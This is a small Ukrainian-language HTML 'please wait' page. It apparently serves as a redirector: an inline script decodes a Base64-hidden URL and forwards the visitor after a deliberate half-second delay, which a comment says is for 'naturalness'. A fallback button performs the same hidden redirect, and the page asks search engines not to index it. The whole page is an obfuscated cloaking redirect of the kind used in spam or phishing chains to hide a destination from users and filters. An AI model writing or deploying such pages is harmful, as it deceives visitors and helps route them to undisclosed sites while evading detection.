<!DOCTYPE html>
<html lang="uk">
  <head>
    <meta charset="UTF-8">
    <title>Зачекай...</title>
    <meta name="robots" content="noindex, nofollow">
    <script>
      // Зашифрований URL у Base64
      const encoded = "aHR0cDovL2x1bWVvaG9tZS5vbmxpbmU=";
      // Розшифровка і редирект
      setTimeout(() => {
        const url = atob(encoded);
        window.location.href = url;
      }, 500); // затримка для "природності"
    </script>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding-top: 50px;
        background-color: #f9f9f9;
        color: #444;
      }
    </style>
  </head>
  <body>
    <h1>Зачекай...</h1>
    <p>Тебе буде перенаправлено. Якщо не перенаправляє — натисни кнопку нижче:</p>
    <button onclick="window.location.href=atob('aHR0cDovL2x1bWVvaG9tZS5vbmxpbmU=')">
      Перейти вручну
    </button>
  </body>
</html>
